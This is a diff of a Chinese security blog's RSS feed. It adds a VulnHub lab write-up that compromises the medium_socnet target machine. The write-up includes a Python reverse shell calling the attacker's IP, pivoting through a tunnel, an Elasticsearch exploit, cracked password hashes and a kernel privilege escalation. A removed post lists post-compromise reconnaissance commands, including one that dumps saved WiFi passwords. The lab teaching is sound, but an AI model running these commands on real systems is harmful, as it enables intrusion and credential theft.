@@ -10,14 +10,167 @@
         </author>
         <description>一个妄想全栈web小废物</description>
         <language>zh-CN</language>
-        <pubDate>Mon, 10 Jul 2023 00:00:00 +0800</pubDate>
-        <lastBuildDate>Mon, 10 Jul 2023 00:00:00 +0800</lastBuildDate>
+        <pubDate>Tue, 11 Jul 2023 00:00:00 +0800</pubDate>
+        <lastBuildDate>Tue, 11 Jul 2023 00:00:00 +0800</lastBuildDate>
         <category term="Clown" />
         <category term="Web" />
         <category term="Pwn" />
         <category term="CTF" />
         <category term="AWD" />
         <category term="ACM" />
+        <item>
+            <guid isPermalink="true">https://blog.xcu.icu/2023/07/11/medium_socnet%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/</guid>
+            <title>记一次古老的靶机medium_socnet的打靶记录</title>
+            <link>https://blog.xcu.icu/2023/07/11/medium_socnet%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/</link>
+            <category term="Vulnhub" scheme="https://blog.xcu.icu/categories/Vulnhub/" />
+            <category term="Vulnhub" scheme="https://blog.xcu.icu/tags/Vulnhub/" />
+            <pubDate>Tue, 11 Jul 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;medium-socnet靶机记录&#34;&gt;&lt;a href=&#34;#medium-socnet靶机记录&#34; class=&#34;headerlink&#34; title=&#34;medium_socnet靶机记录&#34;&gt;&lt;/a&gt;medium_socnet靶机记录&lt;/h1&gt;&lt;h2 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近一段时间各种忙，我又各种懒，最后一科课业答辩结束后突然就闲下来了，突然之间不知道该干什么了，找了一个靶机浅浅的玩一下，这里做一个简单的记录，靶机的下载地址是&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYm9yZWRoYWNrZXJibG9nLXNvY2lhbC1uZXR3b3JrLDQ1NC8=&#34;&gt;无聊黑客博客： 社交网络 ~ VulnHub&lt;/span&gt;，这个是一个很老的靶机了，所以虽然是中等难度，做起来还是比较轻松的&lt;/p&gt;
+&lt;h2 id=&#34;靶机描述&#34;&gt;&lt;a href=&#34;#靶机描述&#34; class=&#34;headerlink&#34; title=&#34;靶机描述&#34;&gt;&lt;/a&gt;靶机描述&lt;/h2&gt;&lt;p&gt;留言是一个新的匿名社交网站，用户可以在其中为彼此发布消息。 他们指派您测试他们的设置。他们确实使用码头工人容器。您也可以对这些进行攻击。尝试看看是否可以在主机上获得root权限。&lt;/p&gt;
+&lt;p&gt;难度：中级&lt;/p&gt;
+&lt;p&gt;涉及的任务：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;端口扫描&lt;/li&gt;
+&lt;li&gt;网页应用攻击&lt;/li&gt;
+&lt;li&gt;代码注入&lt;/li&gt;
+&lt;li&gt;旋转&lt;/li&gt;
+&lt;li&gt;开发&lt;/li&gt;
+&lt;li&gt;密码破解&lt;/li&gt;
+&lt;li&gt;暴力破解&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;虚拟机：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;格式： 虚拟机 （Virtualbox OVA）&lt;/li&gt;
+&lt;li&gt;操作系统： Linux.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;联网：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DHCP 服务：已启用&lt;/li&gt;
+&lt;li&gt;IP 地址自动分配&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这在VirtualBox而不是VMware上效果更好。&lt;/p&gt;
+&lt;h2 id=&#34;攻击流程&#34;&gt;&lt;a href=&#34;#攻击流程&#34; class=&#34;headerlink&#34; title=&#34;攻击流程&#34;&gt;&lt;/a&gt;攻击流程&lt;/h2&gt;&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a href=&#34;#信息收集&#34; class=&#34;headerlink&#34; title=&#34;信息收集&#34;&gt;&lt;/a&gt;信息收集&lt;/h3&gt;&lt;p&gt;这里因为靶机和我的kali都使用nat模式都在一局域网中，这里直接使用arp-scan来进行一个主机发现&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710211421646.png&#34; alt=&#34;image-20230710211421646&#34;&gt;&lt;/p&gt;
+&lt;p&gt;当然这里直接使用nmap也是可以的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710211548048.png&#34; alt=&#34;image-20230710211548048&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到，目标靶机是开启了22端口和5000端口，接下来使用-sV来探测服务和版本信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710211750675.png&#34; alt=&#34;image-20230710211750675&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到这里的22端口上就是一个ssh，且是一个乌班图系统，5000端口是一个http服务，且环境是python，python版本是2.7&lt;/p&gt;
+&lt;p&gt;这里尝试去访问一下这个5000端口，看一下上面运行的一个具体业务&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710212221997.png&#34; alt=&#34;image-20230710212221997&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里测试了一下，发现会将用户的输入都展示到页面上，首先我是怀疑有模版注入，毕竟python回显，属于做ctf触发关键词了，但是发现并没有经过渲染&lt;/p&gt;
+&lt;p&gt;这里还处于信息收集的阶段，扫描目录是必不可少的，这里是使用dirsearch工具进行一个扫描&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710212726917.png&#34; alt=&#34;image-20230710212726917&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里也是发现了又一个admin路由可以访问，这里去访问一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710212917421.png&#34; alt=&#34;image-20230710212917421&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里看到这里是一个管理页面，这里是一个代码执行，这里尝试去用python反弹一个shell&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((&amp;quot;192.168.10.129&amp;quot;,4444));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在kali这里监听这个4444端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711074337267.png&#34; alt=&#34;image-20230711074337267&#34;&gt;&lt;/p&gt;
+&lt;p&gt;运行这段代码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711074420640.png&#34; alt=&#34;image-20230711074420640&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里已经拿到了这个shell，但是这里可以看到，桌面这里有一个Dockerfile文件，这里可能只是在容器内，这里可以通过两个命令去判断一下是不是docker容器&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;ls -a / |grep &amp;quot;.docker*&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711075452457.png&#34; alt=&#34;image-20230711075452457&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;cat /proc/1/cgroup
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711075656444.png&#34; alt=&#34;image-20230711075656444&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这二者都存在的话就可以确定这里拿到的shell是docker容器中的shell。&lt;/p&gt;
+&lt;h3 id=&#34;内网信息收集&#34;&gt;&lt;a href=&#34;#内网信息收集&#34; class=&#34;headerlink&#34; title=&#34;内网信息收集&#34;&gt;&lt;/a&gt;内网信息收集&lt;/h3&gt;&lt;p&gt;这里他是在docker中，我们可以将其视为内网的主机，这里可以看一下ip来进行一个常规的探测&lt;/p&gt;
+&lt;p&gt;先看一下拿到shell的这个docker的ip&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711081457617.png&#34; alt=&#34;image-20230711081457617&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里的ip地址是172.17.0.3，16位，这里同网段下的ip很多，这里用shell脚本去探测&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;shell&#34;&gt;for i in $(seq 0 255); do
+    for j in $(seq 1 254); do
+        ping -c 1 172.17.$i.$j
+    done
+done
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711085009954.png&#34; alt=&#34;image-20230711085009954&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到172.17.0.1，172.17.0.2，172.17.0.3（自身）是存活的，这里接下来就收集一下这三台主机的端口，这里172是内网网段想要使用kali的工具首先需要做内网穿透来建立一个通道&lt;/p&gt;
+&lt;h3 id=&#34;内网穿透&#34;&gt;&lt;a href=&#34;#内网穿透&#34; class=&#34;headerlink&#34; title=&#34;内网穿透&#34;&gt;&lt;/a&gt;内网穿透&lt;/h3&gt;&lt;p&gt;这里我用的是Venom&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0RsaXYzL1Zlbm9tL3JlbGVhc2VzL3RhZy92MS4xLjA=&#34;&gt;Release Venom v1.1.0 · Dliv3&amp;#x2F;Venom (github.com)&lt;/span&gt;这个工具，这里首先我再kali运行服务端admin文件监听9999端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711090850888.png&#34; alt=&#34;image-20230711090850888&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着再kali上开启一个http服务将客户端传送给靶机&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711091015534.png&#34; alt=&#34;image-20230711091015534&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着在靶机上使用wget来将客户端down下来&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711091514408.png&#34; alt=&#34;image-20230711091514408&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里运行去连接服务端，注意：这里要给与一个执行权限&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711091840340.png&#34; alt=&#34;image-20230711091840340&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这样就成功的与服务端建立了连接&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711091943160.png&#34; alt=&#34;image-20230711091943160&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里进入到这个节点后启动一个socks监听8888端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711093204818.png&#34; alt=&#34;image-20230711093204818&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里去更改配置文件sudo vim &amp;#x2F;etc&amp;#x2F;proxychains4.conf &lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711093145434.png&#34; alt=&#34;image-20230711093145434&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞利用Elasticsearch&#34;&gt;&lt;a href=&#34;#漏洞利用Elasticsearch&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用Elasticsearch&#34;&gt;&lt;/a&gt;漏洞利用Elasticsearch&lt;/h3&gt;&lt;p&gt;这样就可以开对内网进行扫描了&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;proxychains nmap -Pn -sT 172.17.0.1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711093453070.png&#34; alt=&#34;image-20230711093453070&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里扫描完成，发现开启的端口也是22和5000，这里也是扫描了一下另一台主机&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711095509435.png&#34; alt=&#34;image-20230711095509435&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现这里只有5000端口，这里再通过nmap进行一个服务的发现&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;proxychains nmap -p22,5000 -Pn -sT -sV 172.17.0.1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711093821859.png&#34; alt=&#34;image-20230711093821859&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里再浏览器上挂上代理，然后去尝试访问一下扫描到的服务，这里可以看到，这台主机和已经拿到shell的主机上面服务是一样的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711095021961.png&#34; alt=&#34;image-20230711095021961&#34;&gt;&lt;/p&gt;
+&lt;p&gt;对9200端口进行一个服务发现&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711095657154.png&#34; alt=&#34;image-20230711095657154&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里上面是开启了一个Elasticsearch服务，版本是1.4.2，这里也是去网上查询了一下&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xODAyMjU4&#34;&gt;Elasticsearch漏洞总结-腾讯云开发者社区-腾讯云 (tencent.com)&lt;/span&gt;，这里历史版本漏洞还是比较多的，也可以直接使用searchsploit来查找历史漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711103506477.png&#34; alt=&#34;image-20230711103506477&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里还附带了exp，这里分别copy过来尝试一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104103616.png&#34; alt=&#34;image-20230711104103616&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104249462.png&#34; alt=&#34;image-20230711104249462&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里也是拿到了一个shell，当然了这里拿到的还是一个docker容器的权限&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104449777.png&#34; alt=&#34;image-20230711104449777&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但是在其根目录发现了一个passwords的文件，这里去查看一下这个文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104624747.png&#34; alt=&#34;image-20230711104624747&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到其中存放了用户名和密码，当然这里的密码很显然不是明文存放，这里通过在线网站对哈希进行一个碰撞，这里我碰撞的是这个admin的值&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104851103.png&#34; alt=&#34;image-20230711104851103&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里对所有的文件都进行碰撞，很幸运的是都拿到了结果&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;john:3f8184a7343664553fcb5337a3138814 		1337hack
+test:861f194e9d6118f3d942a72be3e51749		1234test
+admin:670c3bbc209a18dde5446e5e6c1f1d5b		1111pass
+root:b3d34352fc26117979deabdf1b9b6354		1234pass
+jane:5c158b60ed97c723b673529b8a3cf72b		1234jane
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里拿到账号密码，尝试去登录靶机&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711105556646.png&#34; alt=&#34;image-20230711105556646&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里用第一组账号密码就可以通过ssh连接上，但是经过尝试只有这个账号能够登录上&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711105752762.png&#34; alt=&#34;image-20230711105752762&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里进行尝试没有sudo，所以这里还需要提权&lt;/p&gt;
+&lt;h3 id=&#34;提权&#34;&gt;&lt;a href=&#34;#提权&#34; class=&#34;headerlink&#34; title=&#34;提权&#34;&gt;&lt;/a&gt;提权&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711105916576.png&#34; alt=&#34;image-20230711105916576&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在ssh连接上的时候可以发现这里的内核版本是3.13,这里还是用searchsploit找一下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;searchsploit ubuntu 3.13.0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711110123363.png&#34; alt=&#34;image-20230711110123363&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里尝试第一个，cp到当前目录后，这里因为是c源码文件所以要使用gcc编译一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711110752376.png&#34; alt=&#34;image-20230711110752376&#34;&gt;&lt;/p&gt;
+&lt;p&gt;值得注意的是源码中有这样一行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711111430353.png&#34; alt=&#34;image-20230711111430353&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在这里它又去通过gcc想去编译一个c语言的库文件，但是目标靶机经过查看是没有安装gcc的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711111639937.png&#34; alt=&#34;image-20230711111639937&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以这里就算是我再kali上编译好了它也不能直接在目标靶机上运行，这里就需要修改源码，最简单的思路就是将这个库文件一起打包，让源码直接调用这个库文件，而不在编译&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711112209565.png&#34; alt=&#34;image-20230711112209565&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到我将原有的编译库文件的部分删除，只保留打开文件利用的部分，修改后通过gcc编译&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711112404436.png&#34; alt=&#34;image-20230711112404436&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里有报错但是不用管，是能够编译成功的，接着在kali上寻找一下缺少的库文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711112750984.png&#34; alt=&#34;image-20230711112750984&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里找到这个文件后将这个文件移动到当前目录，然后还是通过python开启一个http服务，让目标靶机下载这两个文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711113045641.png&#34; alt=&#34;image-20230711113045641&#34;&gt;&lt;/p&gt;
+&lt;p&gt;下载成功后将两个文件都移动到tmp目录下，并且给exp一个可执行权限&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711120913465.png&#34; alt=&#34;image-20230711120913465&#34;&gt;&lt;/p&gt;
+&lt;p&gt;齐活&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://blog.xcu.icu/2023/07/10/CommonsCollections-3/</guid>
             <title>ConmonsCollection-3</title>
@@ -7840,127 +7993,6 @@ print(argparse.parse_args())
 &lt;li&gt;数据库投入运行标志着开发任务的基本完成和维护工作的开始&lt;/li&gt;
 &lt;li&gt;对数据库设计进行评价、调整、修改等维护工作是个长期的任务，也是设计工作的继续和提高&lt;/li&gt;
 &lt;/ol&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://blog.xcu.icu/2022/12/23/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
-            <title>内网信息收集</title>
-            <link>https://blog.xcu.icu/2022/12/23/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
-            <category term="内网" scheme="https://blog.xcu.icu/categories/%E5%86%85%E7%BD%91/" />
-            <category term="域环境" scheme="https://blog.xcu.icu/tags/%E5%9F%9F%E7%8E%AF%E5%A2%83/" />
-            <pubDate>Fri, 23 Dec 2022 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h3 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h3&gt;
-&lt;p&gt;本篇对内网信息收集做一个补充，这里的命令是运行在 cs 上线的前提下，在命令前要加上 shell&lt;/p&gt;
-&lt;h3 id=&#34;控制机信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#控制机信息收集&#34;&gt;#&lt;/a&gt; 控制机信息收集&lt;/h3&gt;
-&lt;h4 id=&#34;网段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网段&#34;&gt;#&lt;/a&gt; 网段&lt;/h4&gt;
-&lt;p&gt;这个很简单，使用 ipconfig 就可以知道 ip 也就可以知道网段，通过网段可以去扫描其他存活主机&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194008596.png&#34; alt=&#34;image-20221223194008596&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;进程信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进程信息&#34;&gt;#&lt;/a&gt; 进程信息&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;tasklist
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194159288.png&#34; alt=&#34;image-20221223194159288&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;开机自启&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开机自启&#34;&gt;#&lt;/a&gt; 开机自启&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;wmic startup get command,caption
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194454199.png&#34; alt=&#34;image-20221223194454199&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;开机自启如果它后面没有引号可以利用它来提权，提到高权限就会很危险，这里仅做信息收集不在展开&lt;/p&gt;
-&lt;h4 id=&#34;开机时间&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开机时间&#34;&gt;#&lt;/a&gt; 开机时间&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;net statistics workstation
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194903747.png&#34; alt=&#34;image-20221223194903747&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;查看本地用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看本地用户&#34;&gt;#&lt;/a&gt; 查看本地用户&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;net user
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195008118.png&#34; alt=&#34;image-20221223195008118&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;会话连接情况&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#会话连接情况&#34;&gt;#&lt;/a&gt; 会话连接情况&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;netstat -ano
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195227859.png&#34; alt=&#34;image-20221223195227859&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;查看补丁信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看补丁信息&#34;&gt;#&lt;/a&gt; 查看补丁信息&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;通过这个可以判断一些漏洞有没有被修补&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195521086.png&#34; alt=&#34;image-20221223195521086&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;查看默认共享&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看默认共享&#34;&gt;#&lt;/a&gt; 查看默认共享&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;net share
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195825193.png&#34; alt=&#34;image-20221223195825193&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;共享是有很多漏洞点控制的&lt;/p&gt;
-&lt;h4 id=&#34;路由信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路由信息&#34;&gt;#&lt;/a&gt; 路由信息&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;route print
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223200054631.png&#34; alt=&#34;image-20221223200054631&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;防火墙信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防火墙信息&#34;&gt;#&lt;/a&gt; 防火墙信息&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;net firewall show config
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223200348100.png&#34; alt=&#34;image-20221223200348100&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;wifi连接记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wifi连接记录&#34;&gt;#&lt;/a&gt; wifi 连接记录&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;for /f &amp;quot;skip=9 tokens=1,2 delims=:&amp;quot; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里因为我搭建的域内服务器没有信息这里放的是我本地的截图&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223200840295.png&#34; alt=&#34;image-20221223200840295&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;arp信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arp信息&#34;&gt;#&lt;/a&gt; ARP 信息&lt;/h4&gt;
-&lt;p&gt;看还有哪些网段&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;arp -a
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201027450.png&#34; alt=&#34;image-20221223201027450&#34; /&gt;&lt;/p&gt;
